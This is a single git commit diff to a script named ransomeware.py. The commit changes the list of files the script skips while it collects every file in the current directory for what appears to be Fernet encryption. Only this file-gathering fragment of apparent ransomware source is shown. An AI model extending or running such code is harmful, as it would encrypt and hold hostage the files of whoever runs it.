acb67903010fc01934afedfa83c7e344d8aad230
BrandonDelliquadri <48575959+BrandonDelliquadri@users.noreply.github.com>
2025-05-23 11:37:12 -0700

    Update ransomeware.py

--- ransomeware.py
+++ ransomeware.py
@@ -8,7 +8,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "reaperdeathseal.py" or file == "thekey.key" or file == "decrypt.py":
+	if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
